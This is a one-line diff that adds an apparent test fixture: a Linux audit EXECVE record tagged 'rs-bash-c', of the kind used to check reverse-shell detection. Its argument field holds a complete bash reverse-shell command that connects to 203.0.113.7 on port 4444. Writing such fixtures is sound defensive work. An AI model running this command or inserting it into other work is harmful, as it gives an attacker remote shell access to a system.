@@ -1,0 +1,1 @@
+{"type": "EXECVE", "msg": "audit(1790762400.123:4242):", "TestEventId": "rs-bash-c", "argc": 3, "a0": "bash", "a1": "-c", "a2": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"}
